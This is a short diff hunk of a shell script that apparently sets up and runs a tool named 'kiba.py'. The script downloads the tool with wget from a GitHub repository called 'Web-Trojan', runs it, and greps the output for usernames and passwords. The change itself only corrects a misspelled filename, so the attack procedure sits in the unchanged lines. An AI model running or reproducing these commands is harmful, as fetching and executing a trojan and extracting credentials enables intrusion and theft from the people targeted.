@@ -18,5 +18,5 @@ apt-get install -y python-pip
 pip install requests
 wget https://raw.githubusercontent.com/cipher1234/Web-Trojan/master/kiba.py -O kiba.py
 python /kiba.py > kiba.txt
-cat /iba.txt | grep "Username"
+cat /kiba.txt | grep "Username"
 cat /kiba.txt | grep "Password"
